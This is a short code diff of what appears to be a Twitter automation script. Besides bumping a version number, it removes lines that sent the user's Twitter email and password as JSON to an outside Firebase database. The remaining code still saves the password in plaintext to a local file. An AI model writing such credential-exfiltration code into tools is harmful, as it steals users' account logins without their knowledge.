@@ -1,4 +1,4 @@
-update_version = 3
+update_version = 4
 import json
 import requests
 import random
@@ -502,11 +502,6 @@ print(f'{bcolors.OKGREEN}Password is correct{bcolors.BOLD}')
 file = open('Twitter_login.txt', 'w+')
 
 file.write(f'{Auto_Login_Email}\n{Auto_Login_PASSWORD}')
-
-data = {'Twitter_id': Auto_Login_Email, 'Twitter_Pass': Auto_Login_PASSWORD}
-
-send_database = requests.post('https://script-beta-default-rtdb.firebaseio.com/save_id.json',
-                              headers={'Content-type': 'application/json'}, json=data)
 
 file.close()
 
